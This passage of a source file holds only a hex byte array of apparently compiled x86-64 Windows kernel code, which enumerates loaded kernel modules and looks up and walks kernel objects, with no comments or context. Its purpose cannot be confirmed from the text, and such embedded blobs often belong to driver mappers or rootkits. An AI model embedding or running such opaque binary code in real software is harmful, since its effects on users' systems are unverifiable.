	0x00, 0x00, 0x48, 0x83, 0x3D, 0x02, 0x6F, 0x00, 0x00, 0x00, 0x74, 0x27,
	0x48, 0x83, 0xBC, 0x24, 0xF0, 0x00, 0x00, 0x00, 0x00, 0x74, 0x10, 0x48,
	0x8B, 0x84, 0x24, 0xF0, 0x00, 0x00, 0x00, 0x8B, 0x0D, 0xEF, 0x6E, 0x00,
	0x00, 0x89, 0x08, 0x48, 0x8B, 0x05, 0xDE, 0x6E, 0x00, 0x00, 0xE9, 0xA9,
	0x02, 0x00, 0x00, 0xE8, 0x1C, 0xDD, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24,
	0x60, 0x48, 0x8B, 0x44, 0x24, 0x60, 0x48, 0x89, 0x44, 0x24, 0x68, 0x48,
	0x8D, 0x15, 0x96, 0x3F, 0x00, 0x00, 0x48, 0x8D, 0x8C, 0x24, 0xC8, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x68, 0xFF, 0x15, 0x0B, 0x5E, 0x00,
	0x00, 0xE8, 0x7E, 0xDD, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x70, 0x48,
	0x8B, 0x44, 0x24, 0x70, 0x48, 0x89, 0x44, 0x24, 0x78, 0x48, 0x8D, 0x8C,
	0x24, 0xC8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x78, 0xFF, 0x15,
	0xE4, 0x5D, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x50, 0x48, 0x83, 0x7C,
	0x24, 0x50, 0x00, 0x75, 0x07, 0x33, 0xC0, 0xE9, 0x40, 0x02, 0x00, 0x00,
	0xE8, 0x43, 0xDA, 0xFF, 0xFF, 0x48, 0x89, 0x84, 0x24, 0x80, 0x00, 0x00,
	0x00, 0x8B, 0x44, 0x24, 0x34, 0x89, 0x44, 0x24, 0x58, 0x48, 0x8B, 0x84,
	0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x88, 0x00, 0x00,
	0x00, 0x4C, 0x8D, 0x4C, 0x24, 0x34, 0x44, 0x8B, 0x44, 0x24, 0x58, 0x33,
	0xD2, 0xB9, 0x0B, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0x88, 0x00,
	0x00, 0x00, 0xFF, 0x15, 0x8C, 0x5D, 0x00, 0x00, 0x89, 0x44, 0x24, 0x40,
	0x83, 0x7C, 0x24, 0x34, 0x00, 0x75, 0x07, 0x33, 0xC0, 0xE9, 0xEA, 0x01,
	0x00, 0x00, 0xE8, 0x5D, 0xD9, 0xFF, 0xFF, 0x48, 0x89, 0x84, 0x24, 0x90,
	0x00, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x34, 0x48, 0x89, 0x84, 0x24, 0x98,
	0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00, 0x48,
	0x89, 0x84, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x6B, 0x73, 0x45,
	0x00, 0x48, 0x8B, 0x94, 0x24, 0x98, 0x00, 0x00, 0x00, 0x33, 0xC9, 0x48,
	0x8B, 0x84, 0x24, 0xA0, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x33, 0x5D, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x83, 0x7C, 0x24, 0x38, 0x00,
	0x74, 0x16, 0x8B, 0x44, 0x24, 0x34, 0x44, 0x8B, 0xC0, 0x33, 0xD2, 0x48,
	0x8B, 0x4C, 0x24, 0x38, 0xE8, 0x4B, 0x3B, 0x00, 0x00, 0x90, 0xEB, 0x07,
	0x33, 0xC0, 0xE9, 0x79, 0x01, 0x00, 0x00, 0xE8, 0x7C, 0xD9, 0xFF, 0xFF,
	0x48, 0x89, 0x84, 0x24, 0xA8, 0x00, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x34,
	0x89, 0x44, 0x24, 0x5C, 0x48, 0x8B, 0x84, 0x24, 0xA8, 0x00, 0x00, 0x00,
	0x48, 0x89, 0x84, 0x24, 0xB0, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x4C, 0x24,
	0x34, 0x44, 0x8B, 0x44, 0x24, 0x5C, 0x48, 0x8B, 0x54, 0x24, 0x38, 0xB9,
	0x0B, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xB0, 0x00, 0x00, 0x00,
	0xFF, 0x15, 0xC2, 0x5C, 0x00, 0x00, 0x89, 0x44, 0x24, 0x40, 0x83, 0x7C,
	0x24, 0x40, 0x00, 0x0F, 0x8C, 0xDE, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44,
	0x24, 0x38, 0x48, 0x83, 0xC0, 0x08, 0x48, 0x89, 0x44, 0x24, 0x48, 0xC7,
	0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24,
	0x30, 0xFF, 0xC0, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x38,
	0x8B, 0x00, 0x39, 0x44, 0x24, 0x30, 0x0F, 0x83, 0xAB, 0x00, 0x00, 0x00,
	0x8B, 0x44, 0x24, 0x30, 0x48, 0x69, 0xC0, 0x28, 0x01, 0x00, 0x00, 0x48,
	0x8B, 0x4C, 0x24, 0x48, 0x48, 0x8B, 0x44, 0x01, 0x10, 0x48, 0x39, 0x44,
	0x24, 0x50, 0x0F, 0x82, 0x86, 0x00, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x30,
	0x48, 0x69, 0xC0, 0x28, 0x01, 0x00, 0x00, 0x8B, 0x4C, 0x24, 0x30, 0x48,
	0x69, 0xC9, 0x28, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x54, 0x24, 0x48, 0x8B,
	0x4C, 0x0A, 0x18, 0x48, 0x8B, 0x54, 0x24, 0x48, 0x48, 0x03, 0x4C, 0x02,
	0x10, 0x48, 0x8B, 0xC1, 0x48, 0x39, 0x44, 0x24, 0x50, 0x73, 0x53, 0x8B,
	0x44, 0x24, 0x30, 0x48, 0x69, 0xC0, 0x28, 0x01, 0x00, 0x00, 0x48, 0x8B,
	0x4C, 0x24, 0x48, 0x48, 0x8B, 0x44, 0x01, 0x10, 0x48, 0x89, 0x05, 0xB1,
	0x6C, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x30, 0x48, 0x69, 0xC0, 0x28, 0x01,
	0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0x8B, 0x44, 0x01, 0x18, 0x89,
	0x05, 0x9F, 0x6C, 0x00, 0x00, 0x48, 0x83, 0xBC, 0x24, 0xF0, 0x00, 0x00,
	0x00, 0x00, 0x74, 0x10, 0x48, 0x8B, 0x84, 0x24, 0xF0, 0x00, 0x00, 0x00,
	0x8B, 0x0D, 0x86, 0x6C, 0x00, 0x00, 0x89, 0x08, 0xEB, 0x05, 0xE9, 0x3A,
	0xFF, 0xFF, 0xFF, 0x48, 0x83, 0x7C, 0x24, 0x38, 0x00, 0x74, 0x36, 0xE8,
	0x90, 0xDC, 0xFF, 0xFF, 0x48, 0x89, 0x84, 0x24, 0xB8, 0x00, 0x00, 0x00,
	0x48, 0x8B, 0x84, 0x24, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24,
	0xC0, 0x00, 0x00, 0x00, 0xBA, 0x6B, 0x73, 0x45, 0x00, 0x48, 0x8B, 0x4C,
	0x24, 0x38, 0x48, 0x8B, 0x84, 0x24, 0xC0, 0x00, 0x00, 0x00, 0xFF, 0x15,
	0x98, 0x5B, 0x00, 0x00, 0x90, 0x48, 0x8B, 0x05, 0x30, 0x6C, 0x00, 0x00,
	0x48, 0x81, 0xC4, 0xE8, 0x00, 0x00, 0x00, 0xC3, 0x48, 0x89, 0x4C, 0x24,
	0x08, 0x48, 0x81, 0xEC, 0xC8, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24,
	0x48, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x34, 0x00, 0x00, 0x00,
	0x00, 0xE8, 0xDE, 0xD7, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48,
	0x8B, 0x44, 0x24, 0x58, 0x48, 0x89, 0x44, 0x24, 0x60, 0x4C, 0x8D, 0x4C,
	0x24, 0x34, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0xB9, 0x0B, 0x00, 0x00, 0x00,
	0x48, 0x8B, 0x44, 0x24, 0x60, 0xFF, 0x15, 0x3D, 0x5B, 0x00, 0x00, 0x89,
	0x44, 0x24, 0x38, 0x81, 0x7C, 0x24, 0x38, 0x04, 0x00, 0x00, 0xC0, 0x74,
	0x0A, 0x48, 0x8B, 0x44, 0x24, 0x48, 0xE9, 0x89, 0x01, 0x00, 0x00, 0xE8,
	0xF8, 0xDA, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x68, 0x8B, 0x44, 0x24,
	0x34, 0x48, 0x89, 0x44, 0x24, 0x70, 0x48, 0x8B, 0x44, 0x24, 0x68, 0x48,
	0x89, 0x44, 0x24, 0x78, 0x48, 0x8B, 0x54, 0x24, 0x70, 0x33, 0xC9, 0x48,
	0x8B, 0x44, 0x24, 0x78, 0xFF, 0x15, 0xF6, 0x5A, 0x00, 0x00, 0x48, 0x89,
	0x44, 0x24, 0x40, 0x48, 0x83, 0x7C, 0x24, 0x40, 0x00, 0x75, 0x0A, 0x48,
	0x8B, 0x44, 0x24, 0x48, 0xE9, 0x43, 0x01, 0x00, 0x00, 0xE8, 0x52, 0xD7,
	0xFF, 0xFF, 0x48, 0x89, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x8B, 0x44,
	0x24, 0x34, 0x89, 0x44, 0x24, 0x50, 0x48, 0x8B, 0x84, 0x24, 0x80, 0x00,
	0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x45, 0x33,
	0xC9, 0x44, 0x8B, 0x44, 0x24, 0x50, 0x48, 0x8B, 0x54, 0x24, 0x40, 0xB9,
	0x0B, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00,
	0xFF, 0x15, 0x9A, 0x5A, 0x00, 0x00, 0x89, 0x44, 0x24, 0x38, 0x83, 0x7C,
	0x24, 0x38, 0x00, 0x7D, 0x3F, 0x0F, 0xAE, 0xE8, 0xE8, 0x4F, 0xDB, 0xFF,
	0xFF, 0x48, 0x89, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84,
	0x24, 0x90, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x98, 0x00, 0x00,
	0x00, 0x33, 0xD2, 0x48, 0x8B, 0x4C, 0x24, 0x40, 0x48, 0x8B, 0x84, 0x24,
	0x98, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x5A, 0x5A, 0x00, 0x00, 0x48, 0x8B,
	0x44, 0x24, 0x48, 0xE9, 0xB4, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x30,
	0x00, 0x00, 0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x30, 0xFF, 0xC0,
	0x89, 0x44, 0x24, 0x30, 0x8B, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x4C, 0x24,
	0x40, 0x48, 0x3B, 0x01, 0x73, 0x5B, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24,
	0x30, 0x48, 0x69, 0xC0, 0x28, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24,
	0x40, 0x48, 0x8D, 0x44, 0x01, 0x30, 0x48, 0x89, 0x84, 0x24, 0xA0, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x94, 0x24, 0xD0, 0x00, 0x00, 0x00, 0x48, 0x8B,
	0x8C, 0x24, 0xA0, 0x00, 0x00, 0x00, 0xE8, 0x81, 0x2D, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x1F, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x69, 0xC0, 0x28, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x40, 0x48,
	0x8B, 0x44, 0x01, 0x18, 0x48, 0x89, 0x44, 0x24, 0x48, 0xEB, 0x02, 0xEB,
	0x8D, 0xE8, 0x96, 0xDA, 0xFF, 0xFF, 0x48, 0x89, 0x84, 0x24, 0xA8, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xA8, 0x00, 0x00, 0x00, 0x48, 0x89,
	0x84, 0x24, 0xB0, 0x00, 0x00, 0x00, 0x33, 0xD2, 0x48, 0x8B, 0x4C, 0x24,
	0x40, 0x48, 0x8B, 0x84, 0x24, 0xB0, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xA1,
	0x59, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x48, 0x48, 0x81, 0xC4, 0xC8,
	0x00, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x48, 0xE8, 0x57, 0xF9, 0xFF,
	0xFF, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8D, 0x05, 0xCB, 0x3A, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8D, 0x05, 0xCF, 0x3A, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x28, 0x4C, 0x8B, 0x44, 0x24, 0x28, 0x48,
	0x8B, 0x54, 0x24, 0x30, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0xE8, 0xC6, 0xF5,
	0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x83, 0x7C, 0x24, 0x20,
	0x00, 0x75, 0x04, 0x33, 0xC0, 0xEB, 0x15, 0x41, 0xB8, 0x06, 0x00, 0x00,
	0x00, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x20, 0xE8,
	0xC0, 0x0E, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x48, 0xC3, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x48,
	0xE8, 0xE7, 0xF8, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8D,
	0x05, 0x3B, 0x3A, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8D,
	0x05, 0x3F, 0x3A, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x28, 0x4C, 0x8B,
	0x44, 0x24, 0x28, 0x48, 0x8B, 0x54, 0x24, 0x30, 0x48, 0x8B, 0x4C, 0x24,
	0x38, 0xE8, 0x56, 0xF5, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48,
	0x83, 0x7C, 0x24, 0x20, 0x00, 0x75, 0x04, 0x33, 0xC0, 0xEB, 0x18, 0x41,
	0xB8, 0x07, 0x00, 0x00, 0x00, 0xBA, 0x03, 0x00, 0x00, 0x00, 0x48, 0x8B,
	0x4C, 0x24, 0x20, 0xE8, 0x50, 0x0E, 0x00, 0x00, 0x48, 0x8B, 0x00, 0x48,
	0x83, 0xC4, 0x48, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x83, 0xEC, 0x68, 0xE8, 0x77, 0xF8, 0xFF, 0xFF, 0x48, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8D, 0x15, 0x6B, 0x39, 0x00, 0x00, 0x48, 0x8B, 0x4C,
	0x24, 0x20, 0xE8, 0xF1, 0xF6, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x28,
	0xB8, 0x2C, 0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x48, 0xB8, 0x2E,
	0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x4A, 0x48, 0x8D, 0x05, 0x61,
	0x39, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x50, 0x48, 0x8B, 0x44, 0x24,
	0x28, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x89, 0x44, 0x24, 0x38, 0x48, 0x8D, 0x4C, 0x24, 0x48, 0x48, 0x8B, 0x44,
	0x24, 0x38, 0xFF, 0x15, 0x40, 0x58, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24,
	0x40, 0x48, 0x8B, 0x44, 0x24, 0x40, 0x48, 0x83, 0xC4, 0x68, 0xC3, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x4C, 0x24,
	0x08, 0x48, 0x81, 0xEC, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xAD,
	0x3A, 0x00, 0x00, 0x48, 0x8D, 0x8C, 0x24, 0x90, 0x00, 0x00, 0x00, 0xFF,
	0x15, 0x97, 0x57, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x48, 0x00, 0x00,
	0x00, 0x00, 0x48, 0x8D, 0x44, 0x24, 0x48, 0x48, 0x89, 0x44, 0x24, 0x38,
	0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0xC6, 0x44, 0x24,
	0x28, 0x00, 0x48, 0x8B, 0x05, 0xC7, 0x57, 0x00, 0x00, 0x48, 0x8B, 0x00,
	0x48, 0x89, 0x44, 0x24, 0x20, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0xBA,
	0x40, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8C, 0x24, 0x90, 0x00, 0x00, 0x00,
	0xFF, 0x15, 0x86, 0x57, 0x00, 0x00, 0x89, 0x44, 0x24, 0x40, 0x83, 0x7C,
	0x24, 0x40, 0x00, 0x7D, 0x0C, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x40,
	0xE9, 0x63, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x68, 0x3A, 0x00, 0x00,
	0x48, 0x8D, 0x8C, 0x24, 0xA0, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x22, 0x57,
	0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x78, 0x00, 0x00, 0x00, 0x00, 0x48,
	0x8D, 0x44, 0x24, 0x78, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0xC7, 0x44,
	0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0xC6, 0x44, 0x24, 0x28, 0x00, 0x48,
	0x8B, 0x05, 0x52, 0x57, 0x00, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x44,
	0x24, 0x20, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0xBA, 0x40, 0x00, 0x00,
	0x00, 0x48, 0x8D, 0x8C, 0x24, 0xA0, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x11,
	0x57, 0x00, 0x00, 0x89, 0x44, 0x24, 0x40, 0x83, 0x7C, 0x24, 0x40, 0x00,
	0x7D, 0x20, 0x0F, 0xAE, 0xE8, 0x48, 0x83, 0x7C, 0x24, 0x48, 0x00, 0x74,
	0x0C, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xFF, 0x15, 0xE0, 0x56, 0x00, 0x00,
	0x90, 0x8B, 0x44, 0x24, 0x40, 0xE9, 0xDA, 0x01, 0x00, 0x00, 0x48, 0xC7,
	0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B,
	0x44, 0x24, 0x78, 0x48, 0x8B, 0x40, 0x08, 0x48, 0x89, 0x44, 0x24, 0x60,
	0x48, 0x83, 0x7C, 0x24, 0x60, 0x00, 0x0F, 0x84, 0x4A, 0x01, 0x00, 0x00,
	0x48, 0x8B, 0x84, 0x24, 0xC0, 0x00, 0x00, 0x00, 0x48, 0x83, 0x78, 0x08,
	0x00, 0x0F, 0x85, 0x37, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x48,
	0x48, 0x8B, 0x40, 0x08, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x83, 0x7C,
	0x24, 0x58, 0x00, 0x0F, 0x84, 0x0A, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x84,
	0x24, 0xC0, 0x00, 0x00, 0x00, 0x48, 0x83, 0x78, 0x08, 0x00, 0x0F, 0x85,
	0xF7, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x58, 0x48, 0x83, 0x78,
	0x10, 0x00, 0x75, 0x1E, 0x48, 0x8B, 0x84, 0x24, 0xC0, 0x00, 0x00, 0x00,
	0x48, 0x83, 0x38, 0x00, 0x75, 0x10, 0x48, 0x8B, 0x84, 0x24, 0xC0, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x48, 0x89, 0x08, 0x48, 0x8B,
	0x44, 0x24, 0x60, 0x48, 0x8B, 0x40, 0x40, 0x48, 0x89, 0x44, 0x24, 0x70,
	0x48, 0x8B, 0x44, 0x24, 0x60, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x48, 0x8B,
	0x49, 0x40, 0x48, 0x8B, 0x80, 0x38, 0x01, 0x00, 0x00, 0x48, 0x2B, 0xC1,
	0x33, 0xD2, 0xB9, 0x04, 0x00, 0x00, 0x00, 0x48, 0xF7, 0xF1, 0x48, 0x89,
	0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x48, 0x48,
	0x8B, 0x40, 0x18, 0x48, 0x89, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48,
	0xC7, 0x44, 0x24, 0x50, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x0D, 0x48, 0x8B,
	0x44, 0x24, 0x50, 0x48, 0xFF, 0xC0, 0x48, 0x89, 0x44, 0x24, 0x50, 0x48,
	0x8B, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x39, 0x44, 0x24, 0x50,
	0x73, 0x4A, 0x48, 0x8B, 0x44, 0x24, 0x70, 0x48, 0x8B, 0x4C, 0x24, 0x50,
	0x48, 0x8B, 0x54, 0x24, 0x58, 0x48, 0x39, 0x14, 0xC8, 0x75, 0x33, 0x48,
	0x8B, 0x44, 0x24, 0x70, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0x48, 0x8B, 0x54,
	0x24, 0x48, 0x48, 0x39, 0x54, 0xC8, 0x08, 0x76, 0x1D, 0x48, 0x8B, 0x84,
	0x24, 0xC0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x70, 0x48, 0x8B,
	0x54, 0x24, 0x50, 0x48, 0x8B, 0x4C, 0xD1, 0x08, 0x48, 0x89, 0x48, 0x08,
	0xEB, 0x02, 0xEB, 0x9A, 0x48, 0x8B, 0x44, 0x24, 0x58, 0x48, 0x8B, 0x40,
	0x10, 0x48, 0x89, 0x44, 0x24, 0x58, 0xE9, 0xEA, 0xFE, 0xFF, 0xFF, 0x48,
	0x8B, 0x44, 0x24, 0x60, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x89, 0x44, 0x24,
	0x60, 0xE9, 0xAA, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x84, 0x24, 0xC0, 0x00,
	0x00, 0x00, 0x48, 0x83, 0x38, 0x00, 0x75, 0x44, 0x48, 0x8B, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x40, 0x08, 0x48, 0x89, 0x44, 0x24, 0x68, 0x48, 0x83,
	0x7C, 0x24, 0x68, 0x00, 0x74, 0x2E, 0x48, 0x8B, 0x44, 0x24, 0x68, 0x48,
	0x83, 0x78, 0x10, 0x00, 0x75, 0x12, 0x48, 0x8B, 0x84, 0x24, 0xC0, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x68, 0x48, 0x89, 0x08, 0xEB, 0x10,
	0x48, 0x8B, 0x44, 0x24, 0x68, 0x48, 0x8B, 0x40, 0x10, 0x48, 0x89, 0x44,
	0x24, 0x68, 0xEB, 0xCA, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xFF, 0x15, 0x09,
	0x55, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x78, 0xFF, 0x15, 0xFE, 0x54,
	0x00, 0x00, 0x33, 0xC0, 0x48, 0x81, 0xC4, 0xB8, 0x00, 0x00, 0x00, 0xC3,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x38, 0xC7, 0x44, 0x24, 0x20,
	0x00, 0x00, 0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0,
	0x89, 0x44, 0x24, 0x20, 0x83, 0x7C, 0x24, 0x20, 0x32, 0x73, 0x2C, 0x0F,
	0xAE, 0xE8, 0xE8, 0xF9, 0xFB, 0xFF, 0xFF, 0x8B, 0x4C, 0x24, 0x20, 0x48,
	0x6B, 0xC9, 0x28, 0x48, 0x03, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48,
	0x8B, 0x4C, 0x24, 0x28, 0xE8, 0x1F, 0x00, 0x00, 0x00, 0x85, 0xC0, 0x74,
	0x04, 0x33, 0xC0, 0xEB, 0x07, 0xEB, 0xC3, 0xB8, 0x01, 0x00, 0x00, 0x00,
	0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x8B, 0x44,
	0x24, 0x08, 0x0F, 0xB7, 0x40, 0x02, 0x85, 0xC0, 0x74, 0x18, 0x48, 0x8B,
	0x44, 0x24, 0x08, 0x0F, 0xB7, 0x00, 0x85, 0xC0, 0x74, 0x0C, 0x48, 0x8B,
	0x44, 0x24, 0x08, 0x48, 0x83, 0x78, 0x08, 0x00, 0x75, 0x07, 0xB8, 0x01,
	0x00, 0x00, 0x00, 0xEB, 0x02, 0x33, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x48,
	0x0F, 0xB6, 0x05, 0x99, 0x85, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x0C, 0x0F,
	0xB6, 0x05, 0x8D, 0x85, 0x00, 0x00, 0xE9, 0x9D, 0x00, 0x00, 0x00, 0xE8,
	0x50, 0xF4, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x83, 0x7C,
	0x24, 0x20, 0x00, 0x75, 0x17, 0xC6, 0x05, 0x6F, 0x85, 0x00, 0x00, 0x00,
	0xC6, 0x05, 0x69, 0x85, 0x00, 0x00, 0x01, 0x0F, 0xB6, 0x05, 0x61, 0x85,
	0x00, 0x00, 0xEB, 0x74, 0x48, 0x8D, 0x05, 0x05, 0x35, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x30, 0x48, 0x8D, 0x05, 0x09, 0x35, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x28, 0x4C, 0x8B, 0x44, 0x24, 0x28, 0x48, 0x8B, 0x54,
	0x24, 0x30, 0x48, 0x8B, 0x4C, 0x24, 0x20, 0xE8, 0xA0, 0xF0, 0xFF, 0xFF,
	0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x83, 0x7C, 0x24, 0x38, 0x00, 0x74,
	0x09, 0xC6, 0x05, 0x1F, 0x85, 0x00, 0x00, 0x01, 0xEB, 0x0B, 0xE8, 0x35,
	0x00, 0x00, 0x00, 0x88, 0x05, 0x12, 0x85, 0x00, 0x00, 0xC6, 0x05, 0x0C,
	0x85, 0x00, 0x00, 0x01, 0x0F, 0xB6, 0x05, 0x04, 0x85, 0x00, 0x00, 0xEB,
	0x17, 0xC6, 0x05, 0xFB, 0x84, 0x00, 0x00, 0x00, 0xC6, 0x05, 0xF5, 0x84,
	0x00, 0x00, 0x01, 0x0F, 0xB6, 0x05, 0xED, 0x84, 0x00, 0x00, 0xEB, 0x00,
	0x48, 0x83, 0xC4, 0x48, 0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x58,
	0x0F, 0xB6, 0x05, 0xD7, 0x84, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x0C, 0x0F,
	0xB6, 0x05, 0xCB, 0x84, 0x00, 0x00, 0xE9, 0xC1, 0x00, 0x00, 0x00, 0xE8,
	0x90, 0xF3, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x83, 0x7C,
	0x24, 0x20, 0x00, 0x75, 0x1A, 0xC6, 0x05, 0xAD, 0x84, 0x00, 0x00, 0x00,
	0xC6, 0x05, 0xA7, 0x84, 0x00, 0x00, 0x01, 0x0F, 0xB6, 0x05, 0x9F, 0x84,
	0x00, 0x00, 0xE9, 0x95, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xE2, 0x33,
